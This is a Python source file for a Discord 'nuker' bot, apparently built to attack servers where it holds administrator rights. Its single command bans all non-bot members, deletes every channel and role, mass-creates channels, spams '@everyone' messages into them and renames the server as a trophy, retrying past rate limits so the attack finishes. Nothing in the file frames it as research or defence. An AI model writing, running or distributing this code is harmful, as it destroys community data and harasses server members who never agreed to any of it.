import discord
from discord.ext import commands
import asyncio
import aiohttp

TOKEN = "YOUR_TOKEN_HERE"
SPAM_MSG = "@everyone nuked by spent0000"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

async def safe(coro_fn, *args, **kwargs):
    while True:
        try:
            return await coro_fn(*args, **kwargs)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after + 0.1)
                continue
            return None
        except Exception:
            return None

@bot.command()
async def nuke(ctx, create: int = 100, spam: int = 10, cap: int = 500):
    guild = ctx.guild
    await safe(ctx.message.delete)
    ban_tasks = [safe(m.ban, reason="nuked")
                 for m in guild.members
                 if m.id != bot.user.id and not m.bot]
    await asyncio.gather(*ban_tasks)
    await asyncio.gather(*[safe(ch.delete) for ch in guild.channels],
                         *[safe(r.delete) for r in guild.roles
                           if r.name != "@everyone"])
    sem = asyncio.Semaphore(8)
    created = []
    async def make(name):
        async with sem:
            if len(guild.channels) >= cap:
                return
            ch = await safe(guild.create_text_channel, name)
            if ch:
                created.append(ch)
    await asyncio.gather(*[make(f"Spent{i:03d}") for i in range(create)])
    async def spam_ch(ch):
        for _ in range(spam):
            await safe(ch.send, SPAM_MSG)
    await asyncio.gather(*[spam_ch(c) for c in created])
    await safe(guild.edit, name="NUKED BY SPENT0000")

